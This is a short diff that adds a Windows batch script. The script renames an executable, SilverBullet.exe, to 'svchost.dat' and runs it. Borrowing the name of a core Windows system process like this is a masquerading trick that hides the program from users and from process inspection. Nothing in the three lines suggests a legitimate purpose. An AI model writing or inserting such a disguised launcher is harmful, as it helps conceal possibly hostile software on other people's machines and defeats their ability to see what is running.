@@ -1,0 +1,3 @@
+@echo off
+rename SilverBullet.exe svchost.dat
+start "" svchost.dat
